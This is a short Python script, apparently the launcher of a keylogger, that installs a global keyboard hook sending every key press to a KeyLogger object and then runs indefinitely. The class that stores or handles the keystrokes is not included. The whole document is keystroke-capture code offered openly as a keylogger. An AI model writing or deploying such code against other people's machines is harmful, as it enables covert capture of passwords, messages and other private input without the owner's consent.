import keyboard
from keylogger import KeyLogger


logger = KeyLogger()
keyboard.hook(logger.key_pressed)
keyboard.wait()
